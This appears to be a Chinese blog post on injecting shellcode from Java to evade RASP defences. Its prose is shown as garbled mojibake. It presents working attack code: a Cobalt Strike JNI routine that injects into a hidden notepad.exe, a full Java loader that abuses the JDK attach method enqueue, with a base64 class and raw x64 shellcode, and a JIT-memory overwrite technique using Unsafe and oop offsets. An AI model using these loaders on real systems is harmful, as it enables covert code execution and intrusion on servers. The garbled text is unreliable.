    <content type="text"><![CDATA[ÂâçË®ÄÈöèÁùÄRASPÊäÄÊúØÁöÑÂèëÂ±ïÔºåÊôÆÈÄöwebshellÂ∑≤ÁªèÂæàÈöæÊúâÁî®Ê≠¶‰πãÂú∞ÔºåÁîöËá≥ÊòØÂêÑÁßçÂÜÖÂ≠òÈ©¨‰πüÈÄêÊ∏êÊçâË•üËßÅËÇò„ÄÇÁßâÊâøÁùÄ„ÄäJSP WebshellÈÇ£‰∫õ‰∫ã‚Äî‚ÄîÊîªÂáªÁØáÔºà‰∏äÔºâ„Äã‰∏≠Âêë‰∏ãËµ∞ÁöÑÊÄùË∑ØÔºåÂ≠ò‰∏çÂ≠òÂú®‰∏ÄÁßçÂú®Java‰ª£Á†Å‰∏≠ÊâßË°åÊú∫Âô®Á†ÅÁöÑÊñπÊ≥ïÂë¢ÔºüÁ≠îÊ°àÊòØËÇØÂÆöÁöÑÔºåÂ∏∏ËßÅÁöÑÊ≥®ÂÖ•ÊñπÂºèÊúâJNI„ÄÅJNAÂíåÂà©Áî®JDKËá™Â∏¶ÁöÑNativeÊñπÊ≥ïÁ≠âÔºåÂÖ∂‰∏≠Á¨îËÄÖËøòÊâæÂà∞‰∫Ü‰∏ÄÁßçÈ≤úÊúâÊñáÁ´†‰ªãÁªçÁöÑÔºåÂü∫‰∫éHotSpotËôöÊãüÊú∫Ôºå‰∏îËæÉ‰∏∫ÈÄöÁî®ÁöÑÊ≥®ÂÖ•ÊñπÊ≥ï„ÄÇ Âü∫‰∫éJNIJavaÂ∫ïÂ±ÇËôΩÁÑ∂ÊòØC/C++ÂÆûÁé∞ÁöÑÔºå‰ΩÜ‰∏çËÉΩÁõ¥Êé•ÊâßË°åC/C++‰ª£Á†Å„ÄÇËã•ÊÉ≥Ë¶ÅÊâßË°åC/C++ÁöÑ‰ª£Á†ÅÔºå‰∏ÄËà¨ÂæóÈÄöËøáJNIÔºåÂç≥JavaÊú¨Âú∞Ë∞ÉÁî®ÔºàJava Native InterfaceÔºâÔºåÂä†ËΩΩJNIÈìæÊé•Â∫ìÔºåË∞ÉÁî®NativeÊñπÊ≥ïÂÆûÁé∞„ÄÇ Cobalt StrikeÂÆòÁΩëÂçöÂÆ¢‰∏äÊúâ‰∏ÄÁØá„ÄäÂ¶Ç‰Ωï‰ªéJavaÊ≥®ÂÖ•shellcode„ÄãÁöÑÊñáÁ´†Ôºå‰æøÊòØÂü∫‰∫éJNIÂÆûÁé∞ÔºåÈÄöËøáNativeÊñπÊ≥ïË∞ÉÁî®C/C++‰ª£Á†ÅÂ∞ÜshellcodeÊ≥®ÂÖ•Âà∞ÂÜÖÂ≠ò‰∏≠„ÄÇ 1234567//C/C++‰ª£Á†Å‰∏≠Â£∞ÊòéÁöÑÂáΩÊï∞ÂØπÂ∫îDemo#injectÊú¨Âú∞ÊñπÊ≥ïJNIEXPORT void JNICALL Java_Demo_inject(JNIEnv * env, jobject object, jbyteArray jdata) &#123; jbyte * data = (*env)-&gt;GetByteArrayElements(env, jdata, 0); jsize length = (*env)-&gt;GetArrayLength(env, jdata); inject((LPCVOID)data, (SIZE_T)length); (*env)-&gt;ReleaseByteArrayElements(env, jdata, data, 0);&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253//ÊâßË°åÊ≥®ÂÖ•shellcodeÁöÑ‰ª£Á†Å/* inject some shellcode... enclosed stuff is the shellcode y0 */void inject(LPCVOID buffer, int length) &#123; STARTUPINFO si; PROCESS_INFORMATION pi; HANDLE hProcess = NULL; SIZE_T wrote; LPVOID ptr; char lbuffer[1024]; char cmdbuff[1024]; /* reset some stuff */ ZeroMemory( &amp;si, sizeof(si) ); si.cb = sizeof(si); ZeroMemory( &amp;pi, sizeof(pi) ); /* start a process */ GetStartupInfo(&amp;si); si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; si.hStdOutput = NULL; si.hStdError = NULL; si.hStdInput = NULL; /* resolve windir? */ GetEnvironmentVariableA("windir", lbuffer, 1024); /* setup our path... choose wisely for 32bit and 64bit platforms */ #ifdef _IS64_ _snprintf(cmdbuff, 1024, "%s\\SysWOW64\\notepad.exe", lbuffer); #else _snprintf(cmdbuff, 1024, "%s\\System32\\notepad.exe", lbuffer); #endif /* spawn the process, baby! */ if (!CreateProcessA(NULL, cmdbuff, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi)) return; hProcess = pi.hProcess; if( !hProcess ) return; /* allocate memory in our process */ ptr = (LPVOID)VirtualAllocEx(hProcess, 0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); /* write our shellcode to the process */ WriteProcessMemory(hProcess, ptr, buffer, (SIZE_T)length, (SIZE_T *)&amp;wrote); if (wrote != length) return; /* create a thread in the process */ CreateRemoteThread(hProcess, NULL, 0, ptr, NULL, 0, NULL);&#125; ËøôÁßçÊñπÊ≥ïÈúÄË¶ÅËá™Ë°åÁºñÂÜô‰∏™ÈìæÊé•Â∫ìÔºåÂπ∂‰∏ä‰º†Âà∞ÂèóÂÆ≥ÊúçÂä°Âô®‰∏äÔºåÂà©Áî®Ëµ∑Êù•Âπ∂‰∏çÊòæÂæó‰ºòÈõÖ„ÄÇ ËøòÊúâÂè¶‰∏ÄÁßçÊñπÊ≥ïÊòØÂà©Áî®JNAÁ¨¨‰∏âÊñπÂ∫ìÔºåÂèØ‰ª•Áõ¥Êé•Ë∞ÉÁî®ÂÜÖÊ†∏ÁöÑÂáΩÊï∞ÔºåÂÆûÁé∞ShellcodeÊ≥®ÂÖ•„ÄÇÂú®@yzddmr6Â∏àÂÇÖÁöÑJava-Shellcode-LoaderÈ°πÁõÆ‰∏≠ÊúâÂÆûÁé∞Ôºå‰ΩÜJNAÊú¨Ë¥®‰∏äËøòÊòØÂü∫‰∫éJNIÔºå‰ΩøÁî®Êó∂ËøòÊòØË¶ÅÂä†ËΩΩJNAËá™Â∑±ÁöÑÈìæÊé•Â∫ìÔºåÂπ∂‰∏îJDK‰∏≠ÈªòËÆ§‰∏çÂåÖÂê´JNAËøô‰∏™Á±ªÂ∫ìÔºå‰ΩøÁî®Êó∂ÈúÄË¶ÅÊÉ≥ÂäûÊ≥ïÂºïÂÖ•„ÄÇ Âü∫‰∫éJDKËá™Â∏¶ÁöÑNativeÊñπÊ≥ïÁ¨¨‰∏Ä‰∏™‰ªãÁªçÁöÑÂèØËÉΩÊòØÂÜ∞ËùéÁöÑ‰ΩúËÄÖ@rebeyondÂ∏àÂÇÖÈ¶ñÂÖàÂèëÁé∞ÁöÑÊñπÊ≥ïÔºå‰∏ÄÁßçÂü∫‰∫éJDKËá™Â∏¶ÁöÑNativeÊñπÊ≥ïÁöÑshellcodeÊ≥®ÂÖ•Ôºå‰∏•Ê†ºÊù•ËØ¥ÊòØÂü∫‰∫éHotSpotËôöÊãüÊú∫ÁöÑJDKÁöÑËá™Â∏¶NativeÊñπÊ≥ï„ÄÇÂÆÉÊòØsun/tools/attach/VirtualMachineImpl#enqueueNativeÊñπÊ≥ïÔºåÂ≠òÂú®‰∫éÁî®‰∫éattach JavaËøõÁ®ãÁöÑtools.jarÂåÖ‰∏≠„ÄÇ ÂΩìËøêË°åÂú®Windows‰∏äÊó∂ÔºåÁõ∏Â∫îÁöÑenqueue NativeÊñπÊ≥ïÂÆûÁé∞Âú®/src/jdk.attach/windows/native/libattach/VirtualMachineImpl.c‰∏≠ÔºåÂÖ∂‰∏≠Create thread in target process to execute codeÁöÑÊìç‰ΩúÔºå‰∏çËÉΩËØ¥Ë∑üÂâçÈù¢Cobalt StrikeÊ≥®ÂÖ•shellcodeÁöÑÊìç‰ΩúÊØ´‰∏çÁõ∏Âπ≤ÔºåÂè™ËÉΩËØ¥ÊòØ‰∏ÄÊ®°‰∏ÄÊ†∑„ÄÇ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546JNIEXPORT void JNICALL Java_sun_tools_attach_VirtualMachineImpl_enqueue (JNIEnv *env, jclass cls, jlong handle, jbyteArray stub, jstring cmd, jstring pipename, jobjectArray args)&#123; ... /* * Allocate memory in target process for data and code stub * (assumed aligned and matches architecture of target process) */ hProcess = (HANDLE)handle; pData = (DataBlock*) VirtualAllocEx( hProcess, 0, sizeof(DataBlock), MEM_COMMIT, PAGE_READWRITE ); if (pData == NULL) &#123; JNU_ThrowIOExceptionWithLastError(env, "VirtualAllocEx failed"); return; &#125; WriteProcessMemory( hProcess, (LPVOID)pData, (LPCVOID)&amp;data, (SIZE_T)sizeof(DataBlock), NULL ); stubLen = (DWORD)(*env)-&gt;GetArrayLength(env, stub); stubCode = (*env)-&gt;GetByteArrayElements(env, stub, &amp;isCopy); if ((*env)-&gt;ExceptionOccurred(env)) return; pCode = (PDWORD) VirtualAllocEx( hProcess, 0, stubLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE ); if (pCode == NULL) &#123; JNU_ThrowIOExceptionWithLastError(env, "VirtualAllocEx failed"); VirtualFreeEx(hProcess, pData, 0, MEM_RELEASE); (*env)-&gt;ReleaseByteArrayElements(env, stub, stubCode, JNI_ABORT); return; &#125; WriteProcessMemory( hProcess, (LPVOID)pCode, (LPCVOID)stubCode, (SIZE_T)stubLen, NULL ); (*env)-&gt;ReleaseByteArrayElements(env, stub, stubCode, JNI_ABORT); /* * Create thread in target process to execute code */ hThread = CreateRemoteThread( hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) pCode, pData, 0, NULL ); ...&#125; ÂΩìÁÑ∂‰Ω†‰∏çËÉΩËØ¥Ëøô‰∏™ÊòØbugÔºåÂè™ËÉΩËØ¥ÊòØfeature„ÄÇ Áõ∏Â∫îÁöÑDemoÊòØÊØîËæÉÁÆÄÂçïÔºåÂú®stubÂèÇÊï∞‰∏≠‰º†ÂÖ•shellcodeÂç≥ÂèØÔºå@rebeyondÂ∏àÂÇÖÂ∑≤ÁªèÁªôÂá∫‰∫Ü‰ª£Á†ÅÔºåÁ¨îËÄÖÂú®ËøôÈáåÂÅö‰∫ÜÁÇπÁÆÄÂåñ„ÄÇ‰∏çËøáÂÆûÁé∞NativeÊñπÊ≥ïÁöÑÈìæÊé•Â∫ìattach.dllÈªòËÆ§Â≠òÂú®Ôºå‰ΩÜtools.jarËøô‰∏™ÂåÖ‰∏ç‰∏ÄÂÆöÂ≠òÂú®Ôºå@rebeyondÂ∏àÂÇÖÂ∑ßÂ¶ôÁöÑÂà©Áî®‰∫ÜÂèå‰∫≤ÂßîÊ¥æÊú∫Âà∂ÔºåÂΩìJVM‰∏≠Ê≤°ÊúâÂä†ËΩΩVirtualMachineImplÁ±ªÊó∂ÔºåÂ∞±‰ºö‰ΩøÁî®‰∏ãÈù¢base64ÁºñÁ†ÅÁöÑÁ±ªÊõø‰ª£„ÄÇÂΩìÁÑ∂ËøôÁßçÊñπÊ≥ï‰ªÖÈÄÇÁî®‰∫éWindowsÔºåÂõ†‰∏∫Linux‰∏ãenqueueÂπ∂‰∏çÊòØËøô‰πàÂÆûÁé∞ÁöÑ„ÄÇ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import java.io.ByteArrayOutputStream;import java.lang.reflect.Method;import java.util.Base64;public class WindowsAgentShellcodeLoader &#123; public static void main(String[] args) &#123; try &#123; String classStr = "yv66vgAAADQAMgoABwAjCAAkCgAlACYF//////////8IACcHACgKAAsAKQcAKgoACQArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAChMc3VuL3Rvb2xzL2F0dGFjaC9XaW5kb3dzVmlydHVhbE1hY2hpbmU7AQAHZW5xdWV1ZQEAPShKW0JMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9PYmplY3Q7KVYBAApFeGNlcHRpb25zBwAtAQALb3BlblByb2Nlc3MBAAQoSSlKAQADcnVuAQAFKFtCKVYBAAR2YXIyAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADYnVmAQACW0IBAA1TdGFja01hcFRhYmxlBwAqAQAKU291cmNlRmlsZQEAGldpbmRvd3NWaXJ0dWFsTWFjaGluZS5qYXZhDAAMAA0BAAZhdHRhY2gHAC4MAC8AMAEABHRlc3QBABBqYXZhL2xhbmcvT2JqZWN0DAATABQBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAxAA0BACZzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQALbG9hZExpYnJhcnkBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA9wcmludFN0YWNrVHJhY2UAIQALAAcAAAAAAAQAAQAMAA0AAQAOAAAAMwABAAEAAAAFKrcAAbEAAAACAA8AAAAKAAIAAAAGAAQABwAQAAAADAABAAAABQARABIAAAGIABMAFAABABUAAAAEAAEAFgEIABcAGAABABUAAAAEAAEAFgAJABkAGgABAA4AAAB6AAYAAgAAAB0SArgAAxQABCoSBhIGA70AB7gACKcACEwrtgAKsQABAAUAFAAXAAkAAwAPAAAAGgAGAAAADgAFABAAFAATABcAEQAYABIAHAAVABAAAAAWAAIAGAAEABsAHAABAAAAHQAdAB4AAAAfAAAABwACVwcAIAQAAQAhAAAAAgAi"; Class clazz = new MyClassLoader().get(Base64.getDecoder().decode(classStr)); byte buf[] = new byte[]&#123; (byte) 0xFC, (byte) 0x48, (byte) 0x83, (byte) 0xE4, (byte) 0xF0, (byte) 0xE8, (byte) 0xC0, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0x51, (byte) 0x41, (byte) 0x50, (byte) 0x52, (byte) 0x51, (byte) 0x56, (byte) 0x48, (byte) 0x31, (byte) 0xD2, (byte) 0x65, (byte) 0x48, (byte) 0x8B, (byte) 0x52, (byte) 0x60, (byte) 0x48, (byte) 0x8B, (byte) 0x52, (byte) 0x18, (byte) 0x48, (byte) 0x8B, (byte) 0x52, (byte) 0x20, (byte) 0x48, (byte) 0x8B, (byte) 0x72, (byte) 0x50, (byte) 0x48, (byte) 0x0F, (byte) 0xB7, (byte) 0x4A, (byte) 0x4A, (byte) 0x4D, (byte) 0x31, (byte) 0xC9, (byte) 0x48, (byte) 0x31, (byte) 0xC0, (byte) 0xAC, (byte) 0x3C, (byte) 0x61, (byte) 0x7C, (byte) 0x02, (byte) 0x2C, (byte) 0x20, (byte) 0x41, (byte) 0xC1, (byte) 0xC9, (byte) 0x0D, (byte) 0x41, (byte) 0x01, (byte) 0xC1, (byte) 0xE2, (byte) 0xED, (byte) 0x52, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0x8B, (byte) 0x52, (byte) 0x20, (byte) 0x8B, (byte) 0x42, (byte) 0x3C, (byte) 0x48, (byte) 0x01, (byte) 0xD0, (byte) 0x8B, (byte) 0x80, (byte) 0x88, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x85, (byte) 0xC0, (byte) 0x74, (byte) 0x67, (byte) 0x48, (byte) 0x01, (byte) 0xD0, (byte) 0x50, (byte) 0x8B, (byte) 0x48, (byte) 0x18, (byte) 0x44, (byte) 0x8B, (byte) 0x40, (byte) 0x20, (byte) 0x49, (byte) 0x01, (byte) 0xD0, (byte) 0xE3, (byte) 0x56, (byte) 0x48, (byte) 0xFF, (byte) 0xC9, (byte) 0x41, (byte) 0x8B, (byte) 0x34, (byte) 0x88, (byte) 0x48, (byte) 0x01, (byte) 0xD6, (byte) 0x4D, (byte) 0x31, (byte) 0xC9, (byte) 0x48, (byte) 0x31, (byte) 0xC0, (byte) 0xAC, (byte) 0x41, (byte) 0xC1, (byte) 0xC9, (byte) 0x0D, (byte) 0x41, (byte) 0x01, (byte) 0xC1, (byte) 0x38, (byte) 0xE0, (byte) 0x75, (byte) 0xF1, (byte) 0x4C, (byte) 0x03, (byte) 0x4C, (byte) 0x24, (byte) 0x08, (byte) 0x45, (byte) 0x39, (byte) 0xD1, (byte) 0x75, (byte) 0xD8, (byte) 0x58, (byte) 0x44, (byte) 0x8B, (byte) 0x40, (byte) 0x24, (byte) 0x49, (byte) 0x01, (byte) 0xD0, (byte) 0x66, (byte) 0x41, (byte) 0x8B, (byte) 0x0C, (byte) 0x48, (byte) 0x44, (byte) 0x8B, (byte) 0x40, (byte) 0x1C, (byte) 0x49, (byte) 0x01, (byte) 0xD0, (byte) 0x41, (byte) 0x8B, (byte) 0x04, (byte) 0x88, (byte) 0x48, (byte) 0x01, (byte) 0xD0, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x58, (byte) 0x5E, (byte) 0x59, (byte) 0x5A, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x41, (byte) 0x5A, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x20, (byte) 0x41, (byte) 0x52, (byte) 0xFF, (byte) 0xE0, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x5A, (byte) 0x48, (byte) 0x8B, (byte) 0x12, (byte) 0xE9, (byte) 0x57, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0x5D, (byte) 0x48, (byte) 0xBA, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x8D, (byte) 0x8D, (byte) 0x01, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0xBA, (byte) 0x31, (byte) 0x8B, (byte) 0x6F, (byte) 0x87, (byte) 0xFF, (byte) 0xD5, (byte) 0xBB, (byte) 0xF0, (byte) 0xB5, (byte) 0xA2, (byte) 0x56, (byte) 0x41, (byte) 0xBA, (byte) 0xA6, (byte) 0x95, (byte) 0xBD, (byte) 0x9D, (byte) 0xFF, (byte) 0xD5, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x28, (byte) 0x3C, (byte) 0x06, (byte) 0x7C, (byte) 0x0A, (byte) 0x80, (byte) 0xFB, (byte) 0xE0, (byte) 0x75, (byte) 0x05, (byte) 0xBB, (byte) 0x47, (byte) 0x13, (byte) 0x72, (byte) 0x6F, (byte) 0x6A, (byte) 0x00, (byte) 0x59, (byte) 0x41, (byte) 0x89, (byte) 0xDA, (byte) 0xFF, (byte) 0xD5 &#125;; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); byteArrayOutputStream.write(buf); byteArrayOutputStream.write("calc\0".getBytes()); byte[] result = byteArrayOutputStream.toByteArray(); Method method = clazz.getDeclaredMethod("run", byte[].class); method.invoke(clazz, result); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public static class MyClassLoader extends ClassLoader &#123; public Class get(byte[] bytes) &#123; return super.defineClass(bytes, 0, bytes.length); &#125; &#125;&#125; 12345678910111213141516171819202122package sun.tools.attach;import java.io.IOException;public class WindowsVirtualMachine &#123; public WindowsVirtualMachine() &#123; &#125; static native void enqueue(long var0, byte[] var2, String var3, String var4, Object... var5) throws IOException; static native long openProcess(int var0) throws IOException; public static void run(byte[] buf) &#123; System.loadLibrary("attach"); try &#123; enqueue(-1L, buf, "test", "test"); &#125; catch (Exception var2) &#123; var2.printStackTrace(); &#125; &#125;&#125; Âü∫‰∫éoopÂÅèÁßªËøôÁßçÊòØÂü∫‰∫é@Ryan WinceyÂíå@xxDark‰∏§‰ΩçÂâçËæàÁöÑÊÄªÁªìÔºåÂü∫Êú¨ÂéüÁêÜÊòØÔºöÂ§öÊ¨°Ë∞ÉÁî®Êüê‰∏™ÊñπÊ≥ïÔºå‰ΩøÂÖ∂Êàê‰∏∫ÁÉ≠ÁÇπ‰ª£Á†ÅËß¶ÂèëÂç≥Êó∂ÁºñËØëÔºåÁÑ∂ÂêéÈÄöËøáoopÁöÑÊï∞ÊçÆÁªìÊûÑÂÅèÁßªËÆ°ÁÆóÂá∫JITÂú∞ÂùÄÔºåÊúÄÂêé‰ΩøÁî®UnsafeÂÜôÂÜÖÂ≠òÁöÑÂäüËÉΩÔºåÂ∞ÜshellcodeÂÜôÂÖ•Âà∞JITÂú∞ÂùÄ„ÄÇÂÖ∂‰∏≠Ê∂âÂèäUnsafe„ÄÅOop-KlassÊ®°ÂûãÂíåÂç≥Êó∂ÁºñËØëËøô‰∏â‰∏™ÂâçÁΩÆÁü•ËØÜ„ÄÇ UnsafeÁ±ªUnsafeÁ±ªÊòØjava‰∏≠ÈùûÂ∏∏ÁâπÂà´ÁöÑ‰∏Ä‰∏™Á±ªÔºåÊèê‰æõÁöÑÊìç‰ΩúÂèØ‰ª•Áõ¥Êé•ËØªÂÜôÂÜÖÂ≠ò„ÄÅËé∑ÂæóÂú∞ÂùÄÂÅèÁßªÂÄº„ÄÅÈîÅÂÆöÊàñÈáäÊîæÁ∫øÁ®ã„ÄÇUnsafeÂè™Êúâ‰∏Ä‰∏™ÁßÅÊúâÁöÑÊûÑÈÄ†ÊñπÊ≥ïÔºå‰ΩÜÂú®Á±ªÂä†ËΩΩÊó∂ÂÄôÂú®ÈùôÊÄÅ‰ª£Á†Å‰∏≠‰ºöÂÆû‰æãÂåñ‰∏Ä‰∏™UnsafeÂØπË±°ÔºåËµãÂÄºÁªôUnsafeÁ±ªÁöÑÈùôÊÄÅÂ∏∏ÈáèUnsafeÂ±ûÊÄßÔºåÊàë‰ª¨ÂèçÂ∞ÑËé∑ÂèñÂà∞Ëøô‰∏™UnsafeÂ±ûÊÄßÂç≥ÂèØ„ÄÇ 123Field field = Unsafe.class.getDeclaredField("theUnsafe");field.setAccessible(true);Unsafe unsafe = (Unsafe) field.get(null); UnsafeËØªÂÜôÂÜÖÂ≠òÁöÑÁõ∏ÂÖ≥ÊñπÊ≥ïÊúâgetObject„ÄÅgetAddress„ÄÅgetInt„ÄÅgetLongÂíåputByteÁ≠â„ÄÇ Oop-KlassÊ®°ÂûãHotSpot JVM Â∫ïÂ±ÇÈÉΩÊòØ C/C++ ÂÆûÁé∞ÁöÑÔºåJava ÂØπË±°Âú®JVMÁöÑË°®Á§∫Ê®°ÂûãÂè´ÂÅö‚ÄúOOP-Klass‚ÄùÊ®°ÂûãÔºåÂåÖÊã¨‰∏§ÈÉ®ÂàÜÔºö OOPÔºåÂç≥ Ordinary Object PointÔºåÊôÆÈÄöÂØπË±°ÊåáÈíàÔºåÁî®Êù•ÊèèËø∞ÂØπË±°ÂÆû‰æã‰ø°ÊÅØ„ÄÇ KlassÔºåÁî®Êù•ÊèèËø∞ Java Á±ªÔºåÂåÖÂê´‰∫ÜÂÖÉÊï∞ÊçÆÂíåÊñπÊ≥ï‰ø°ÊÅØÁ≠â„ÄÇ Âú®JavaÁ®ãÂ∫èËøêË°åËøáÁ®ã‰∏≠ÔºåÊØèÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑÂØπË±°ÔºåÂú®JVMÂÜÖÈÉ®Â∞±‰ºöÁõ∏Â∫îÂú∞ÂàõÂª∫‰∏Ä‰∏™ÂØπÂ∫îÁ±ªÂûãÁöÑOOPÂØπË±°„ÄÇJavaÁ±ªÊòØÂØπË±°ÔºåJavaÊñπÊ≥ï‰πüÊòØÂØπË±°ÔºåËÄåJavaÁ±ªÂä†ËΩΩÂÆåÊàêÊó∂Âú®JVM‰∏≠ÁöÑÊúÄÁªà‰∫ßÁâ©Â∞±ÊòØInstanceKlassÔºåÂÖ∂‰∏≠ÂåÖÂê´ÊñπÊ≥ï‰ø°ÊÅØ„ÄÅÂ≠óÊÆµ‰ø°ÊÅØÁ≠â‰∏ÄÂàájava Á±ªÊâÄÂÆö‰πâÁöÑ‰∏ÄÂàáÂÖÉÁ¥†„ÄÇ Âç≥Êó∂ÁºñËØëÔºàJITÔºâ ‰∏∫‰∫Ü‰ºòÂåñJavaÁöÑÊÄßËÉΩ ÔºåJVMÂú®Ëß£ÈáäÂô®‰πãÂ§ñÂºïÂÖ•‰∫ÜÂç≥Êó∂ÔºàJust In TimeÔºâÁºñËØëÂô®ÔºöÂΩìÁ®ãÂ∫èËøêË°åÊó∂ÔºåËß£ÈáäÂô®È¶ñÂÖàÂèëÊå•‰ΩúÁî®Ôºå‰ª£Á†ÅÂèØ‰ª•Áõ¥Êé•ÊâßË°åÔºõÂΩìÊñπÊ≥ïÊàñËÄÖ‰ª£Á†ÅÂùóÂú®‰∏ÄÊÆµÊó∂Èó¥ÂÜÖÁöÑË∞ÉÁî®Ê¨°Êï∞Ë∂ÖËøá‰∫ÜJVMËÆæÂÆöÁöÑÈòàÂÄºÊó∂ÔºåËøô‰∫õÂ≠óËäÇÁ†ÅÂ∞±‰ºöË¢´ÁºñËØëÊàêÊú∫Âô®Á†ÅÔºåÂ≠òÂÖ•codeCache‰∏≠„ÄÇÂú®‰∏ãÊ¨°ÊâßË°åÊó∂ÔºåÂÜçÈÅáÂà∞ËøôÊÆµ‰ª£Á†ÅÔºåÂ∞±‰ºö‰ªécodeCache‰∏≠ËØªÂèñÊú∫Âô®Á†ÅÔºåÁõ¥Êé•ÊâßË°åÔºå‰ª•Ê≠§Êù•ÊèêÂçáÁ®ãÂ∫èËøêË°åÁöÑÊÄßËÉΩ„ÄÇÊï¥‰ΩìÁöÑÊâßË°åËøáÁ®ãÂ§ßËá¥Â¶Ç‰∏ãÂõæÊâÄÁ§∫Ôºö OpenjdkÂíåOracle JDKÂú®ÈªòËÆ§mixedÊ®°Âºè‰∏ã‰ºöÂêØÂä®Âç≥Êó∂ÁºñËØëÔºåÂç≥Êó∂ÁºñËØëÁöÑËß¶ÂèëÈòàÂÄºÂú®ÂÆ¢Êà∑Á´ØÁºñËØëÂô®ÂíåÊúçÂä°Á´ØÁºñËØëÂô®‰∏äÈªòËÆ§ÂÄºÂàÜÂà´‰∏∫1500Âíå10000„ÄÇ ÂéüÁêÜÂàÜÊûêÂú®JVMÁöÑÊú¨‰ΩìÔºöjvm.dllÂíålibjvm.so‰∏≠ÔºåÂ≠òÂú®Ëøô‰∏Ä‰∏™VMStructsÁöÑÁ±ªÔºåÂ≠òÂÇ®‰∫ÜJVM‰∏≠ÂåÖÊã¨oop„ÄÅklass„ÄÅconstantPoolÂú®ÂÜÖÁöÑÊï∞ÊçÆÁªìÊûÑÂíå‰ªñÁöÑÂ±ûÊÄß„ÄÇÂÖ∂‰∏≠Êúâ‰ΩøÁî®JNIEXPORTÊ†áËÆ∞ÁöÑVMStructs„ÄÅVMTypes„ÄÅIntConstantsÂíåLongConstantsÁöÑÂÖ•Âè£„ÄÅÂêçÁß∞„ÄÅÂú∞ÂùÄÁ≠âÂÅèÁßªÁöÑÂèòÈáèÔºåÂÄüÂä©ClassLoaderÁöÑÂÜÖÈÉ®Á±ªNativeLibraryÁöÑfindÊàñfindEntryNativeÊñπÊ≥ïÔºà‰∏éJDKÁöÑÁâàÊú¨ÊúâÂÖ≥Ôºâ,ÂèØËé∑ÂèñÂà∞Ëøô‰∫õÂèòÈáèÁöÑÂÄº„ÄÇ ÁÑ∂ÂêéÈÄöËøáInstanceKlass„ÄÅArray&lt;Method*&gt;„ÄÅMethod„ÄÅConstMethod„ÄÅConstantPool„ÄÅSymbolËøô‰∫õoopÊï∞ÊçÆÁªìÊûÑ‰∏≠ÁöÑÂèòÈáèÂÅèÁßªËÆ°ÁÆóÂá∫JITÁöÑÂú∞ÂùÄ„ÄÇ Êàë‰ª¨Ë¶ÅËÆ°ÁÆóÂá∫ÁöÑÁõÆÊ†áJITÂú∞ÂùÄÊòØÁõÆÊ†áÊñπÊ≥ïÁöÑJITÂú∞ÂùÄÔºåËøôÈúÄË¶ÅÁõÆÊ†áÊñπÊ≥ïÁªèÂ§öÊ¨°Ë∞ÉÁî®Ëß¶ÂèëÂç≥Êó∂ÁºñËØëÔºåÂπ∂Ëá™Âä®ËµãÂÄº_from_compiled_entryÁªìÊûÑÊàêÂëòÔºåÁÑ∂ÂêéÂØπÊØîÊñπÊ≥ïÂêçÂíåSignatureÔºå‰ªéÁõÆÊ†áÁ±ª‰ºóÂ§öÈªòËÆ§ÊñπÊ≥ï‰∏≠ËøáÊª§Âá∫ÁõÆÊ†áÊñπÊ≥ïÊù•ÔºåÂÜçÈÄöËøáMethodÂä†‰∏ä_from_compiled_entryÂÅèÁßªËÆ°ÁÆóÂá∫Êù•„ÄÇÔºàËøôÈáåÁöÑSignatureÂç≥ÂΩ¢Â¶Ç()V„ÄÅ(Ljava/lang/String;)V„ÄÅ()Ljava/lang/String;ÁöÑÊñπÊ≥ïÁ≠æÂêçÔºâ ‰∏äÂõæÊ≤°ÊúâÊèêÂà∞InstanceKlassÁöÑËé∑ÂèñÔºåÂÖ∂ÂÆûÂè™Ë¶ÅÈÄöËøáTarget.classËé∑ÂèñÂà∞ÁõÆÊ†áÁ±ªÁöÑÁ±ªÂÆû‰æãÔºåÂÜçÁî®UnsafeËØªÂèñÁ±ªÂÆû‰æãÂä†‰∏äjava_lang_ClassÁöÑklassÂÅèÁßªÂç≥ÂèØ„ÄÇ 